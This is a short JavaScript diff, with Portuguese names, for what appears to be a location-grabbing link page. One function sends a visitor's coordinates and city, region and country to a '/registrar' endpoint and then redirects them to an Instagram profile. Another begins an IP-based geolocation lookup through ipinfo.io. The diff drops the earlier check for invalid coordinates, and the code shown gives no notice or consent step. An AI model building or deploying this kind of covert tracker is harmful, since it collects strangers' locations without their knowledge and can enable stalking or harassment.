@@ -1,17 +1,13 @@
-function enviarLocalizacao(lat, lon, gps = false) {
-    if (!lat || !lon || lat === 0.0 || lon === 0.0) {
-        console.warn("Localização inválida, não será enviada.");
-        return;
-    }
-
+function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
     fetch('/registrar', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ lat, lon, gps })
+        body: JSON.stringify({ lat, lon, precisa, city, region, country })
     }).finally(() => {
-        window.location.href = 'https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0';
+        window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
     });
 }
+
 
 function tentarLocalizacaoPorIP() {
     fetch('https://ipinfo.io/json?token=SEU_TOKEN_AQUI')  // Substitua por seu token real
